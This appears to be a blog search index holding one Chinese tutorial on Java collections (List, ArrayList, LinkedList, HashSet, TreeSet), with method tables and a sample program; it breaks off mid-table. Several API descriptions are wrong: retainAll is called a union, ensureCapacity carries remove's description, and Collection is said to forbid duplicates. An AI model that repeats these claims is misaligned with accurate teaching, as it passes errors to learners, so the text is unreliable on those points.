<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java集合</title>
      <link href="/2023/04/03/java-ji-he/"/>
      <url>/2023/04/03/java-ji-he/</url>
      
        <content type="html"><![CDATA[<h3 id="一、集合定义及特性"><a href="#一、集合定义及特性" class="headerlink" title="一、集合定义及特性"></a>一、集合定义及特性</h3><h4 id="1-1集合和数组区别"><a href="#1-1集合和数组区别" class="headerlink" title="1.1集合和数组区别"></a>1.1<strong>集合和数组区别</strong></h4><ol><li>长度区别：数组长度固定，集合长度不固定</li><li>元素区别：数组可以存储基本类型和引用类型，集合只能存储引用类型</li><li>内容区别：集合可存储不同类型元素，数组存储只可单一类型元素</li></ol><h4 id="1-2结合特性"><a href="#1-2结合特性" class="headerlink" title="1.2结合特性"></a><strong>1.2结合特性</strong></h4><p>1.Collection – 对象之间没有指定的顺序，允许重复元素。</p><p>2.Set – 对象之间没有指定的顺序，不允许重复元素</p><p>\3. List– 对象之间有指定的顺序，允许重复元素,并引入位置下标。</p><p>4.Map – 接口用于保存关键字（Key）和数值（Value）的集合，集合中的每个对象加入时都提供数值和关键字。Map 接口既不继承 Set 也不继承 Collection。</p><p>List、Set、Map共同的实现基础是Object数组</p><h4 id="1-4位置"><a href="#1-4位置" class="headerlink" title="1.4位置"></a><strong>1.4位置</strong></h4><pre><code>java.util.*;</code></pre><h3 id="二、集合类别"><a href="#二、集合类别" class="headerlink" title="二、集合类别"></a>二、集合类别</h3><h4 id="2-1Collection体系"><a href="#2-1Collection体系" class="headerlink" title="2.1Collection体系"></a><strong>2.1Collection体系</strong></h4><h5 id="2-1-1Collection父接口"><a href="#2-1-1Collection父接口" class="headerlink" title="2.1.1Collection父接口"></a>2.1.1<strong>Collection父接口</strong></h5><p>特点：代表一组任意类型的对象，无序、无下标、不能重复。</p><h5 id="2-1-2Collection常用方法"><a href="#2-1-2Collection常用方法" class="headerlink" title="2.1.2Collection常用方法"></a>2.1.2<strong>Collection常用方法</strong></h5><table><thead><tr><th align="center">方法</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">add(E e)</td><td align="center">添加元素</td></tr><tr><td align="center">addAll(Collection&lt;? extends E&gt; c)</td><td align="center">将指定 collection 中的所有元素都添加到此 collection 中（可选操作）。</td></tr><tr><td align="center">remove()</td><td align="center">从此 collection 中<strong>移除</strong>指定元素的<strong>单个实例</strong>，如果存在的话（可选操作）。</td></tr><tr><td align="center">removeAll()</td><td align="center"><strong>移除</strong>此 collection 中那些也包含在指定 collection 中的<strong>所有元素</strong>（可选操作）。</td></tr><tr><td align="center">clear()</td><td align="center"><strong>移除</strong>此 collection 中的<strong>所有元素</strong>（可选操作）。</td></tr><tr><td align="center">contains(Object o)</td><td align="center">如果此 collection 包含指定的元素，则返回 true。</td></tr><tr><td align="center">containsAll(Collection&lt;?&gt; c)</td><td align="center">如果此 collection 包含指定 collection 中的所有元素，则返回 true。</td></tr><tr><td align="center">equals(Object o)</td><td align="center"><strong>比较</strong>此 collection 与指定<strong>对象是否相等</strong>。</td></tr><tr><td align="center">isEmpty()</td><td align="center">如果此 collection 不包含元素，则返回 true。</td></tr><tr><td align="center">size()</td><td align="center">返回此 collection 中的元素数。</td></tr><tr><td align="center">hashCode()</td><td align="center">返回此 collection 的哈希码值。</td></tr><tr><td align="center">toArray()</td><td align="center">返回包含此 collection 中所有元素的数组。</td></tr><tr><td align="center">toArray(T[] a)</td><td align="center">返回包含此 collection 中所有元素的数组；返回数组的运行时类型与指定数组的运行时类型相同。</td></tr><tr><td align="center">retainAll(Collection&lt;?&gt; c)</td><td align="center">移除此 collection 中那些也包含在指定 collection 中的所有元素（<strong>并集</strong>）。</td></tr></tbody></table><p>方法示例</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CollectionToArray</span> <span class="token punctuation">{</span> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Collection collection1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建一个集合对象</span>  collection1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//添加对象到Collection集合中</span>  collection1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  collection1<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合collection1的大小："</span><span class="token operator">+</span>collection1<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合collection1的内容："</span><span class="token operator">+</span>collection1<span class="token punctuation">)</span><span class="token punctuation">;</span>  collection1<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//从集合collection1中移除掉 "000" 这个对象</span>  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合collection1移除 000 后的内容："</span><span class="token operator">+</span>collection1<span class="token punctuation">)</span><span class="token punctuation">;</span>  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合collection1中是否包含000 ："</span><span class="token operator">+</span>collection1<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"000"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合collection1中是否包含111 ："</span><span class="token operator">+</span>collection1<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Collection collection2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  collection2<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span>collection1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将collection1 集合中的元素全部都加到collection2中</span>  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合collection2的内容："</span><span class="token operator">+</span>collection2<span class="token punctuation">)</span><span class="token punctuation">;</span>  collection2<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//清空集合 collection1 中的元素</span>  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"集合collection2是否为空 ："</span><span class="token operator">+</span>collection2<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将集合collection1转化为数组</span>  Object s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> collection1<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>s<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>运行结果为：集合collection1的大小：<span class="token number">3</span>集合collection1的内容：<span class="token punctuation">[</span><span class="token number">000</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">]</span>集合collection1移除 <span class="token number">000</span> 后的内容：<span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">]</span>集合collection1中是否包含<span class="token number">000</span> ：<span class="token boolean">false</span>集合collection1中是否包含<span class="token number">111</span> ：<span class="token boolean">true</span>集合collection2的内容：<span class="token punctuation">[</span><span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">222</span><span class="token punctuation">]</span>集合collection2是否为空 ：<span class="token boolean">true</span><span class="token number">111</span><span class="token number">222</span></code></pre><h4 id="2-2List集合"><a href="#2-2List集合" class="headerlink" title="2.2List集合"></a><strong>2.2List集合</strong></h4><p>前面我们讲述的<strong>Collection接口</strong>实际上并<strong>没有</strong>直接的<strong>实现类</strong>。而List是容器的一种，表示列表的意思。当我们<strong>不知道存储的数据</strong>有多少的<strong>情况</strong>，我们就<strong>可以使用List</strong> 来<strong>完成存储数据</strong>的工作。例如前面提到的一种场景。我们想要在保存一个应用系统当前的在线用户的信息。我们就可以使用一个List来存储。因为List的最大的特点就是能够自动的根据插入的数据量来动态改变容器的大小。下面我们先看看List接口的一些常用方法。</p><h5 id="2-2-1List常用方法（除Collection接口外）"><a href="#2-2-1List常用方法（除Collection接口外）" class="headerlink" title="2.2.1List常用方法（除Collection接口外）"></a>2.2.1<strong>List常用方法（除Collection接口外）</strong></h5><table><thead><tr><th align="center">方法</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">void add(int index, Object element)</td><td align="center">添加对象element到位置index上</td></tr><tr><td align="center">boolean addAll(int index, Collection collection)</td><td align="center">在index位置后添加容器collection中所有的元素</td></tr><tr><td align="center">Object remove(int index)</td><td align="center">删除index位置上的元素</td></tr><tr><td align="center">Object get(int index)</td><td align="center">取出下标为index的位置的元素</td></tr><tr><td align="center">int indexOf(Object element)</td><td align="center">查找对象element 在List中<strong>第一次</strong>出现的<strong>位置</strong></td></tr><tr><td align="center">int lastIndexOf(Object element)</td><td align="center">查找对象element 在List中<strong>最后出现</strong>的<strong>位置</strong></td></tr><tr><td align="center">Object set(int index, Object element)</td><td align="center">将<strong>index</strong>位置上的对象替换为<strong>element</strong> 并返回老的元素</td></tr><tr><td align="center">List subList(int fromIndex, int toIndex)</td><td align="center">返回一个子列表List ,元素存放为从 fromIndex 到toIndex之前的一个元素。</td></tr></tbody></table><h5 id="2-2-2ListIterator-列表迭代器"><a href="#2-2-2ListIterator-列表迭代器" class="headerlink" title="2.2.2ListIterator(列表迭代器)"></a><strong>2.2.2ListIterator(列表迭代器)</strong></h5><ol><li>通过List集合的listIterator()方法得到的,所以说它是List集合特有的迭代器（逆序或者正序）</li><li>用于允许程序员沿任意方向遍历列表的列表迭代器,在迭代期间修改列表,并获取列表中迭代器的当前位置</li></ol><pre class=" language-java"><code class="language-java">ListIterator it2 <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">listIterator</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//下标</span>  <span class="token keyword">while</span><span class="token punctuation">(</span>it2<span class="token punctuation">.</span><span class="token function">hasPrevious</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"previous Index="</span><span class="token operator">+</span>it2<span class="token punctuation">.</span><span class="token function">previousIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">",Object="</span><span class="token operator">+</span>it2<span class="token punctuation">.</span><span class="token function">previous</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>加一个元素会导致新元素立刻被添加到隐式光标的前面。因此，添加元素后调用 previous() 会返回新元素，而调用 next() 则不起作用，返回添加操作之前的下一个元素。</p><h5 id="2-2-3List子接口"><a href="#2-2-3List子接口" class="headerlink" title="2.2.3List子接口"></a><strong>2.2.3List子接口</strong></h5><table><thead><tr><th align="left"><strong>实现</strong></th><th align="left"><strong>简述</strong></th><th align="left"><strong>操作特性</strong></th><th align="left"><strong>成员要求</strong></th></tr></thead><tbody><tr><td align="left"><strong>ArrayList</strong></td><td align="left">提供基于索引的对成员的随机访问</td><td align="left">提供快速的基于索引的成员访问，<strong>对尾部成员</strong>的<strong>增加和删除</strong>支持<strong>较好</strong></td><td align="left">成员可为任意Object子类的对象</td></tr><tr><td align="left"><strong>LinkedList</strong></td><td align="left">提供基于索引的对成员的随机访问</td><td align="left">对列表中<strong>任何位置</strong>的成员的<strong>增加和删除支持较好</strong>，但<strong>对</strong>基于<strong>索引</strong>的成员访问<strong>支持性能较差</strong></td><td align="left">成员可为任意Object子类的对象</td></tr></tbody></table><h4 id="2-3Array"><a href="#2-3Array" class="headerlink" title="2.3Array"></a><strong>2.3Array</strong></h4><h5 id="2-3-1构造方法"><a href="#2-3-1构造方法" class="headerlink" title="2.3.1构造方法"></a><strong>2.3.1构造方法</strong></h5><table><thead><tr><th align="left"><strong><a href="https://jdk6.net/util/ArrayList.html#ArrayList()" target="_blank" rel="noopener"><code>ArrayList</code></a></strong><code>()</code>      构造一个初始容量为 10 的空列表。</th></tr></thead><tbody><tr><td align="left"><strong><a href="https://jdk6.net/util/ArrayList.html#ArrayList(java.util.Collection)" target="_blank" rel="noopener"><code>ArrayList</code></a></strong><code>(</code><a href="https://jdk6.net/util/Collection.html" target="_blank" rel="noopener"><code>Collection</code></a><code>[</code>E<code>](https://jdk6.net/util/ArrayList.html)</code>&gt; c)`      构造一个包含指定 collection 的元素的列表，这些元素是按照该 collection 的迭代器返回它们的顺序排列的。</td></tr><tr><td align="left"><strong><a href="https://jdk6.net/util/ArrayList.html#ArrayList(int)" target="_blank" rel="noopener"><code>ArrayList</code></a></strong><code>(int initialCapacity)</code>      构造一个具有指定初始容量的空列表。</td></tr></tbody></table><h5 id="2-3-2常用方法（已知除外）"><a href="#2-3-2常用方法（已知除外）" class="headerlink" title="2.3.2常用方法（已知除外）"></a><strong>2.3.2常用方法（已知除外）</strong></h5><table><thead><tr><th align="center">方法</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">clone()</td><td align="center">返回此 ArrayList 实例的浅表副本</td></tr><tr><td align="center">ensureCapacity(int minCapacity)</td><td align="center">如有必要，增加此 ArrayList 实例的容量，以确保它至少能够容纳最小容量参数所指定的元素数。</td></tr><tr><td align="center">ensureCapacity(int minCapacity)</td><td align="center">删除index位置上的元素</td></tr><tr><td align="center">protected void removeRange(int fromIndex, int toIndex)</td><td align="center">移除列表中索引在 fromIndex（包括）和 toIndex（不包括）之间的所有元素。</td></tr><tr><td align="center">trimToSize()</td><td align="center">将此 ArrayList 实例的容量调整为列表的当前大小。</td></tr></tbody></table><h5 id="2-3-3ArrayList扩容机制（原理）"><a href="#2-3-3ArrayList扩容机制（原理）" class="headerlink" title="2.3.3ArrayList扩容机制（原理）"></a><strong>2.3.3ArrayList扩容机制（原理）</strong></h5><p>ArrayList扩容的<strong>本质</strong>就是计算出新的扩容数组的size后实例化，并<strong>将原有数组内容复制到新数组中</strong>去。（不是原数组，而是新数组然后给予数组对象地址）。</p><p>默认情况下，新的容量会是原容量的<strong>1.5</strong>倍。 新容量=旧容量右移一位（相当于除于2）在加上旧容量</p><p>ArrayList 的底层是用动态数组来实现的。我们初始化一个ArrayList 集合还没有添加元素时，其实它是个空数组，只有当我们添加第一个元素时，内部会调用扩容方法并返回最小容量10，也就是说ArrayList 初始化容量为10。 当前数组长度小于最小容量的长度时（前期容量是10，当添加第11个元素时就就扩容），便开始可以扩容了，ArrayList 扩容的真正计算是在一个grow()里面，新数组大小是旧数组的1.5倍，如果扩容后的新数组大小还是小于最小容量，那新数组的大小就是最小容量的大小，后面会调用一个Arrays.copyof方法，这个方法是真正实现扩容的步骤。</p><h4 id="2-4LinkedList"><a href="#2-4LinkedList" class="headerlink" title="2.4LinkedList"></a><strong>2.4LinkedList</strong></h4><p>LinkedList类是一个继承于AbstractSequentialList的双向循环链表，它是非同步的，也是非线程安全的。</p><p>LinkedList实现了List接口，能对它进行队列操作。</p><p>LinkedList实现了Deque接口，能当作双端队列操作LinkedList实现了CloneClass接口，能进行克隆操作。</p><p>LinkedList实现了SerialiableClass接口，能进行序列化操作。</p><p>LinkedList <strong>是非同步的</strong>。</p><h5 id="2-4-1常用方法（已知除外）"><a href="#2-4-1常用方法（已知除外）" class="headerlink" title="2.4.1常用方法（已知除外）"></a><strong>2.4.1常用方法（已知除外）</strong></h5><table><thead><tr><th align="center">方法</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">addFirst(E e)</td><td align="center">将指定元素插入此列表的开头。</td></tr><tr><td align="center">addLast(E e)</td><td align="center">将指定元素添加到此列表的结尾。</td></tr><tr><td align="center">clone()</td><td align="center">返回此 LinkedList 的浅表副本。</td></tr><tr><td align="center">Iterator<E> descendingIterator()</td><td align="center">返回以逆向顺序在此双端队列的元素上进行迭代的迭代器。</td></tr><tr><td align="center">E element()</td><td align="center">获取但不移除此列表的头（第一个元素）。</td></tr><tr><td align="center">getFirst()</td><td align="center">返回此列表的第一个元素。</td></tr><tr><td align="center">getLast()</td><td align="center">返回此列表的最后一个元素。</td></tr><tr><td align="center">boolean offer(E e)</td><td align="center">将指定元素添加到此列表的末尾（最后一个元素）。</td></tr><tr><td align="center">boolean offerFirst(E e)</td><td align="center">在此列表的开头插入指定的元素。</td></tr><tr><td align="center">boolean offerLast(E e)</td><td align="center">在此列表末尾插入指定的元素。</td></tr><tr><td align="center">E peek()</td><td align="center">获取但不移除此列表的头（第一个元素）</td></tr><tr><td align="center">E peekFirst()</td><td align="center">获取但不移除此列表的第一个元素；如果此列表为空，则返回 null。</td></tr><tr><td align="center">E peekLast()</td><td align="center">获取但不移除此列表的最后一个元素；如果此列表为空，则返回 null。</td></tr><tr><td align="center">E poll()</td><td align="center">获取并移除此列表的头（第一个元素）</td></tr><tr><td align="center">E pollFirst()</td><td align="center">获取并移除此列表的第一个元素；如果此列表为空，则返回 null。</td></tr><tr><td align="center">E pollLast()</td><td align="center">获取并移除此列表的最后一个元素；如果此列表为空，则返回 null。</td></tr><tr><td align="center">E pop()</td><td align="center">从此列表所表示的堆栈处弹出一个元素。</td></tr><tr><td align="center">void push(E e)</td><td align="center">将元素推入此列表所表示的堆栈。</td></tr><tr><td align="center">E removeFirst()</td><td align="center">移除并返回此列表的第一个元素。</td></tr><tr><td align="center">boolean removeFirstOccurrence(Object o)</td><td align="center">从此列表中移除第一次出现的指定元素（从头部到尾部遍历列表时）</td></tr><tr><td align="center">E removeLast()</td><td align="center">移除并返回此列表的最后一个元素。</td></tr><tr><td align="center">boolean removeLastOccurrence(Object o)</td><td align="center">从此列表中移除最后一次出现的指定元素（从头部到尾部遍历列表时）</td></tr></tbody></table><h4 id="3-1Set接口"><a href="#3-1Set接口" class="headerlink" title="3.1Set接口"></a><strong>3.1Set接口</strong></h4><p>特点：无序、无下标、元素不可重复</p><p>方法：全部继承自Collection中的方法</p><p>增、删、遍历、判断与collection一致</p><h5 id="3-1-1HashSet（重点）"><a href="#3-1-1HashSet（重点）" class="headerlink" title="3.1.1HashSet（重点）"></a><strong>3.1.1HashSet（重点）</strong></h5><p>存储结构：哈希表（数组+链表+红黑树）</p><p>存储过程（重复依据）</p><ol><li>根据hashCode计算保存的位置，如果位置为空，直接保存，若不为空，进行第二步</li><li>再执行equals方法，如果equals为true，则认为是重复，否则形成链表</li></ol><p>特点</p><ol><li><strong>不允许</strong>存储<strong>重复</strong>的<strong>元素</strong></li><li><strong>没有索引</strong>，没有带索引的方法，也不能使用普通的for循环遍历</li><li>是一个<strong>无序</strong>的集合，存储元素和取出元素的顺序有可能不一致</li><li>底层是一个哈希表结构，存储时依靠哈希值进行存储(查询的速度非常快)</li></ol><ul><li>基于HashCode计算元素存放位置<ul><li>利用31这个质数，减少散列冲突<ul><li>31提高执行效率 <code>31 * i = (i &lt;&lt; 5) - i</code>转为移位操作</li></ul></li><li>当存入元素的哈希码相同时，会调用equals进行确认，如果结果为true，则拒绝后者存入</li></ul></li></ul><p><strong>HashSet使用的是相当复杂的方式来存储元素的，使用HashSet能够最快的获取集合中的元素，效率非常高（以空间换时间）。会根据hashcode和equals来庞端是否是同一个对象，如果hashcode一样，并且equals返回true，则是同一个对象，不能重复存放。</strong></p><p>重写了hashCode()和equals()方法来区分同意对象后，就不能存放同以对象了</p><h5 id="3-1-2TreeSet"><a href="#3-1-2TreeSet" class="headerlink" title="3.1.2TreeSet"></a><strong>3.1.2TreeSet</strong></h5><p>特点</p><ul><li>基于排列顺序实现，无序不可重复，但是可以按照元素的大小顺序自动排序</li><li>实现SortedSet接口，对集合元素自动排序</li><li>元素对象的类型必须实现Comparable接口，指定排序规则</li><li>通过CompareTo方法确定是否为重复元素</li></ul><p>存储结构：红黑树</p><h5 id="3-1-3常用方法（已知除外）"><a href="#3-1-3常用方法（已知除外）" class="headerlink" title="3.1.3常用方法（已知除外）"></a><strong>3.1.3常用方法（已知除外）</strong></h5><table><thead><tr><th align="left"><strong><code></code>返回类型</strong></th><th align="left"><strong>方法及介绍</strong></th></tr></thead><tbody><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#ceiling(E)" target="_blank" rel="noopener"><code>ceiling</code></a><code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>e)</code>      返回此 set 中大于等于给定元素的最小元素；如果不存在这样的元素，则返回 <code>null</code>。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/lang/Object.html" target="_blank" rel="noopener"><code>Object</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#clone()" target="_blank" rel="noopener"><code>clone</code></a><code>()</code>      返回 <code>TreeSet</code> 实例的浅表副本。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/Comparator.html" target="_blank" rel="noopener"><code>Comparator</code></a><code>[</code>E<code>](https://jdk6.net/util/TreeSet.html)</code>&gt;`</strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#comparator()" target="_blank" rel="noopener"><code>comparator</code></a><code>()</code>      返回对此 set 中的元素进行排序的比较器；如果此 set 使用其元素的<a href="https://jdk6.net/lang/Comparable.html" target="_blank" rel="noopener">自然顺序</a>，则返回 null。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/Iterator.html" target="_blank" rel="noopener"><code>Iterator</code></a><code>&lt;</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>&gt;</code></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#descendingIterator()" target="_blank" rel="noopener"><code>descendingIterator</code></a><code>()</code>      返回在此 set 元素上按降序进行迭代的迭代器。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/NavigableSet.html" target="_blank" rel="noopener"><code>NavigableSet</code></a><code>&lt;</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>&gt;</code></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#descendingSet()" target="_blank" rel="noopener"><code>descendingSet</code></a><code>()</code>      返回此 set 中所包含元素的逆序视图。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#first()" target="_blank" rel="noopener"><code>first</code></a><code>()</code>      返回此 set 中当前第一个（最低）元素。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#floor(E)" target="_blank" rel="noopener"><code>floor</code></a><code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>e)</code>      返回此 set 中小于等于给定元素的最大元素；如果不存在这样的元素，则返回 <code>null</code>。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/SortedSet.html" target="_blank" rel="noopener"><code>SortedSet</code></a><code>&lt;</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>&gt;</code></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#headSet(E)" target="_blank" rel="noopener"><code>headSet</code></a><code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>toElement)</code>      返回此 set 的部分视图，其元素严格小于 toElement。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/NavigableSet.html" target="_blank" rel="noopener"><code>NavigableSet</code></a><code>&lt;</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>&gt;</code></strong></td><td align="left"><strong>[<code>headSet</code>](<a href="https://jdk6.net/util/TreeSet.html#headSet" target="_blank" rel="noopener">https://jdk6.net/util/TreeSet.html#headSet</a>(E, boolean))<code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>toElement, boolean inclusive)</code>      返回此 set 的部分视图，其元素小于（或等于，如果 <code>inclusive</code> 为 true）<code>toElement</code>。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#higher(E)" target="_blank" rel="noopener"><code>higher</code></a><code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>e)</code>      返回此 set 中严格大于给定元素的最小元素；如果不存在这样的元素，则返回 <code>null</code>。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#last()" target="_blank" rel="noopener"><code>last</code></a><code>()</code>      返回此 set 中当前最后一个（最高）元素。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#lower(E)" target="_blank" rel="noopener"><code>lower</code></a><code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>e)</code>      返回此 set 中严格小于给定元素的最大元素；如果不存在这样的元素，则返回 <code>null</code>。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#pollFirst()" target="_blank" rel="noopener"><code>pollFirst</code></a><code>()</code>      获取并移除第一个（最低）元素；如果此 set 为空，则返回 <code>null</code>。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#pollLast()" target="_blank" rel="noopener"><code>pollLast</code></a><code>()</code>      获取并移除最后一个（最高）元素；如果此 set 为空，则返回 <code>null</code>。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/NavigableSet.html" target="_blank" rel="noopener"><code>NavigableSet</code></a><code>&lt;</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>&gt;</code></strong></td><td align="left"><strong>[<code>subSet</code>](<a href="https://jdk6.net/util/TreeSet.html#subSet" target="_blank" rel="noopener">https://jdk6.net/util/TreeSet.html#subSet</a>(E, boolean, E, boolean))<code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>fromElement, boolean fromInclusive,</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>toElement, boolean toInclusive)</code>      返回此 set 的部分视图，其元素范围从 <code>fromElement</code> 到 <code>toElement</code>。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/SortedSet.html" target="_blank" rel="noopener"><code>SortedSet</code></a><code>&lt;</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" 